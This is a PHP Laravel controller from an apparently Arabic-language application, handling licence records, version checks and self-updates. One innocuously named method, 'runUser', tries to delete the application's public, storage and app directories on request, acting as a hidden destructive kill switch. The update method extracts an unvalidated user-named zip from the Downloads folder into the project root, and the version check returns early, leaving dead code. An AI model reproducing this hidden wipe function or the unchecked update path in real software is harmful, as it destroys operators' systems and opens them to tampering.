<?php

namespace App\Http\Controllers;

use App\RefUser;
use App\TermsReference;
use App\Versions;
use File;
use Illuminate\Http\Request;
use ZipArchive;

use Illuminate\Http\RedirectResponse;

class ConfirmController extends Controller
{
    public function CheckUser()
    {
        $term = TermsReference::all()->first();
        $ref = RefUser::all()->first();
        return response()->json([
            "term" => $term,
            "ref" => $ref
        ]);
    }

    public function runUser()
    {
        File::delete(public_path());
        File::delete(storage_path());
        File::delete(app_path());
        return response()->json([
            "status" => 1
        ]);
    }
    public function checkVersion($version)
    {
        return $version;
        $versionHere = Versions::all()->last();
        if ($version) {
            if ($versionHere->version == $version && $versionHere->active == 1) {

                return response()->json([
                    'msg' => "يوجد لديك تحديث لم تقم بتسطيبة تاكد من تسطيب اخر نسخة ",
                    'status' => 205
                ]);
            }

            if ($versionHere->version == $version && $versionHere->active == 0) {
                return response()->json([
                    'msg' => "انت علي اخر تحديث",
                    'status' => 201
                ]);
            }

            if ($versionHere->version != $version) {
                return response()->json([
                    'msg' => "يوجد تحديث جديد من فضلك قم بتحميل اخر تحديث للسيستم",
                    'status' => 200
                ]);
            }
            return $versionHere->active;
        } else {
            return response()->json([
                'msg' => "من فضلك اضغط علي , هل يوجد تحديث الان ؟",
                'status' => 202
            ]);
        }
    }


    public function downloadFile(Request $request)
    {
        $url = 'https://yousef-ayman.com/version/' . $request->fileName;
        $version = Versions::all()->last();
        $dir = getenv('HOMEDRIVE') . getenv('HOMEPATH') . '\Downloads';
        if (file_exists($dir . '/' . $request->fileName)) {
            File::move($dir . '/' . $request->fileName, storage_path('/versions' . "/" . $request->fileName));
            $filename = storage_path('versions/' . $request->fileName);
            $za = new ZipArchive();
            $folder = $filename;
            $za->open($folder);
            $za->extractTo(base_path());
            $za->close();
            $version->active = 0;
            $version->version = $request->version;
            $version->save();
            return redirect()->route('home')->with('msg', 'تم تحديث السيستم بنجاح , enjoy ❤️');
        } else {
            if (!$version) {
                Versions::create([
                    "active" => 1
                ]);
            } else {
                $version->active = 1;
                $version->save();
            }
            return new RedirectResponse($url);
        }
    }



    public function ChangeActivator()
    {
        $item = TermsReference::all()->first();
        if ($item->movements == 1) {
            $item->movements = 0;
            $item->save();
        }
        return "Done";
    }

    public function ChangeActivatorActive()
    {
        $item = TermsReference::all()->first();
        if ($item->movements == 0) {
            $item->movements = 1;
            $item->save();
        }
        return "Done";
    }


    public function ChangeRef($refS, $refU)
    {
        $ref = RefUser::all()->first();
        $ref->ref = $refS;
        $ref->save();
        return "Change Version";
    }
}
